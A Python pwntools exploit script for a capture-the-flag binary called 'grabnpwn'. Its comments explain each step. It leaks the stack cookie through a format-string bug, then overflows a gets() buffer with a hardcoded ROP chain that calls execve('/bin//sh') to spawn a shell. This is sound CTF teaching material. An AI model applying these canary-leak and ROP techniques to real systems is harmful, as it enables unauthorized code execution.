#!/usr/bin/env python3

"""
Exploit code for grab-n-pwn.

Description:
    This is a standard pwn challenge of grabbing the stack cookie first and then
    overflowing the stack without failing the runtime stack cookie check.
"""

import os
import sys
from pwn import *
from struct import pack

def exploit():
    
    # Connect to the challenge.
    # Change stuff here if the deployed challenge needs to be tested.
    proc = process('./grabnpwn')

    """
    func1() is called first. It suffers from both BOF and Format String
    vulnerability. It can be seen that the runtime stack-cookie check is enabled.
    So, overflowing the stack and putting ROP/shellcode does not work.

    First, let us get the stack cookie using the Format-String vuln.
    """

    # Send the appropriate format string and leak it.
    format_string = b'%lx %lx %lx %lx %lx %lx %lx %lx %lx %lx %lx %lx %lx %lx %lx %lx %lx %lx %lx %lx %lx %lx %lx %lx %lx'
    proc.sendline(format_string)
    leak = proc.recv()
    print(type(leak))

    leak = leak.split(b' ')

    # Grab it
    stack_cookie = leak[18]
    stack_cookie = '0x' + stack_cookie.decode('utf-8')
    
    # Convert it to little-endian form.
    stack_cookie_sendable = struct.pack('<Q', int(stack_cookie, 16))
    print(stack_cookie, stack_cookie_sendable)

    """
    Now the second part of the exploit.

    It can be observed that func2() makes use of the infamous gets() function.
    It suffers from a BOF. Let us overflow the stack, send out ROP payload
    and get a shell!
    """
    
    # Building the ROP payload
    """
    Everything that is needed to get a shell is present in the grabnpwn executable.
    It is statically linked and PIE disabled(Unaffected by ASLR). Building a 
    ROPChain shouldn't be that hard.
    
    If you want to learn, get the ROP gadgets using ROPgadget tool.
    Else, use the --ropchain option in the ROPgadget to get ready-made chain.
    """
    ropchain = b''
    ropchain += pack('<Q', 0x0000000000410233) # pop rsi ; ret
    ropchain += pack('<Q', 0x00000000006b90e0) # @ .data
    ropchain += pack('<Q', 0x00000000004155e4) # pop rax ; ret
    ropchain += b'/bin//sh'
    ropchain += pack('<Q', 0x000000000047f3d1) # mov qword ptr [rsi], rax ; ret
    ropchain += pack('<Q', 0x0000000000410233) # pop rsi ; ret
    ropchain += pack('<Q', 0x00000000006b90e8) # @ .data + 8
    ropchain += pack('<Q', 0x0000000000444b40) # xor rax, rax ; ret
    ropchain += pack('<Q', 0x000000000047f3d1) # mov qword ptr [rsi], rax ; ret
    ropchain += pack('<Q', 0x0000000000400696) # pop rdi ; ret
    ropchain += pack('<Q', 0x00000000006b90e0) # @ .data
    ropchain += pack('<Q', 0x0000000000410233) # pop rsi ; ret
    ropchain += pack('<Q', 0x00000000006b90e8) # @ .data + 8
    ropchain += pack('<Q', 0x0000000000449805) # pop rdx ; ret
    ropchain += pack('<Q', 0x00000000006b90e8) # @ .data + 8
    
    # rax = System call number = 0x3b (execve's system call number)
    ropchain += pack('<Q', 0x0000000000444b40) # xor rax, rax ; ret
    ropchain += pack('<Q', 0x0000000000474860) # add rax, 1 ; ret
    ropchain += pack('<Q', 0x0000000000474860) # add rax, 1 ; ret
    ropchain += pack('<Q', 0x0000000000474860) # add rax, 1 ; ret
    ropchain += pack('<Q', 0x0000000000474860) # add rax, 1 ; ret
    ropchain += pack('<Q', 0x0000000000474860) # add rax, 1 ; ret
    ropchain += pack('<Q', 0x0000000000474860) # add rax, 1 ; ret
    ropchain += pack('<Q', 0x0000000000474860) # add rax, 1 ; ret
    ropchain += pack('<Q', 0x0000000000474860) # add rax, 1 ; ret
    ropchain += pack('<Q', 0x0000000000474860) # add rax, 1 ; ret
    ropchain += pack('<Q', 0x0000000000474860) # add rax, 1 ; ret
    ropchain += pack('<Q', 0x0000000000474860) # add rax, 1 ; ret
    ropchain += pack('<Q', 0x0000000000474860) # add rax, 1 ; ret
    ropchain += pack('<Q', 0x0000000000474860) # add rax, 1 ; ret
    ropchain += pack('<Q', 0x0000000000474860) # add rax, 1 ; ret
    ropchain += pack('<Q', 0x0000000000474860) # add rax, 1 ; ret
    ropchain += pack('<Q', 0x0000000000474860) # add rax, 1 ; ret
    ropchain += pack('<Q', 0x0000000000474860) # add rax, 1 ; ret
    ropchain += pack('<Q', 0x0000000000474860) # add rax, 1 ; ret
    ropchain += pack('<Q', 0x0000000000474860) # add rax, 1 ; ret
    ropchain += pack('<Q', 0x0000000000474860) # add rax, 1 ; ret
    ropchain += pack('<Q', 0x0000000000474860) # add rax, 1 ; ret
    ropchain += pack('<Q', 0x0000000000474860) # add rax, 1 ; ret
    ropchain += pack('<Q', 0x0000000000474860) # add rax, 1 ; ret
    ropchain += pack('<Q', 0x0000000000474860) # add rax, 1 ; ret
    ropchain += pack('<Q', 0x0000000000474860) # add rax, 1 ; ret
    ropchain += pack('<Q', 0x0000000000474860) # add rax, 1 ; ret
    ropchain += pack('<Q', 0x0000000000474860) # add rax, 1 ; ret
    ropchain += pack('<Q', 0x0000000000474860) # add rax, 1 ; ret
    ropchain += pack('<Q', 0x0000000000474860) # add rax, 1 ; ret
    ropchain += pack('<Q', 0x0000000000474860) # add rax, 1 ; ret
    ropchain += pack('<Q', 0x0000000000474860) # add rax, 1 ; ret
    ropchain += pack('<Q', 0x0000000000474860) # add rax, 1 ; ret
    ropchain += pack('<Q', 0x0000000000474860) # add rax, 1 ; ret
    ropchain += pack('<Q', 0x0000000000474860) # add rax, 1 ; ret
    ropchain += pack('<Q', 0x0000000000474860) # add rax, 1 ; ret
    ropchain += pack('<Q', 0x0000000000474860) # add rax, 1 ; ret
    ropchain += pack('<Q', 0x0000000000474860) # add rax, 1 ; ret
    ropchain += pack('<Q', 0x0000000000474860) # add rax, 1 ; ret
    ropchain += pack('<Q', 0x0000000000474860) # add rax, 1 ; ret
    ropchain += pack('<Q', 0x0000000000474860) # add rax, 1 ; ret
    ropchain += pack('<Q', 0x0000000000474860) # add rax, 1 ; ret
    ropchain += pack('<Q', 0x0000000000474860) # add rax, 1 ; ret
    ropchain += pack('<Q', 0x0000000000474860) # add rax, 1 ; ret
    ropchain += pack('<Q', 0x0000000000474860) # add rax, 1 ; ret
    ropchain += pack('<Q', 0x0000000000474860) # add rax, 1 ; ret
    ropchain += pack('<Q', 0x0000000000474860) # add rax, 1 ; ret
    ropchain += pack('<Q', 0x0000000000474860) # add rax, 1 ; ret
    ropchain += pack('<Q', 0x0000000000474860) # add rax, 1 ; ret
    ropchain += pack('<Q', 0x0000000000474860) # add rax, 1 ; ret
    ropchain += pack('<Q', 0x0000000000474860) # add rax, 1 ; ret
    ropchain += pack('<Q', 0x0000000000474860) # add rax, 1 ; ret
    ropchain += pack('<Q', 0x0000000000474860) # add rax, 1 ; ret
    ropchain += pack('<Q', 0x0000000000474860) # add rax, 1 ; ret
    ropchain += pack('<Q', 0x0000000000474860) # add rax, 1 ; ret
    ropchain += pack('<Q', 0x0000000000474860) # add rax, 1 ; ret
    ropchain += pack('<Q', 0x0000000000474860) # add rax, 1 ; ret
    ropchain += pack('<Q', 0x0000000000474860) # add rax, 1 ; ret
    ropchain += pack('<Q', 0x0000000000474860) # add rax, 1 ; ret
    ropchain += pack('<Q', 0x0000000000474860) # add rax, 1 ; ret

    # Finally, call it
    ropchain += pack('<Q', 0x00000000004012cc) # syscall

    # Building the complete payload
    """
    The stack looks like this:

    |buffer = 100 bytes|padding = 4 bytes|stack-cookie = 8 bytes|old rbp = 8 bytes|return address = 8 bytes|
    """
    payload = b''

    # Junk for the first 104 bytes
    payload += b'a' * 104

    # Then the cookie.
    """
    Why will the cookie used in the previous function be useful in this
    function?

    There is only one stack cookie used throughout the program.
    It is stored in the Thread Local Storage - the area which is
    accessable to all threads. So, if we can leak the cookie once,
    we can use it wherever we want inside the program.
    """
    payload += stack_cookie_sendable
    
    # Junk for old-rbp value.
    payload += b'a' * 8

    # Now, the return address should be overwritten by the address of the first
    # gadget.
    payload += ropchain

    proc.send(payload)
    proc.interactive()


if __name__ == '__main__':
    exploit()
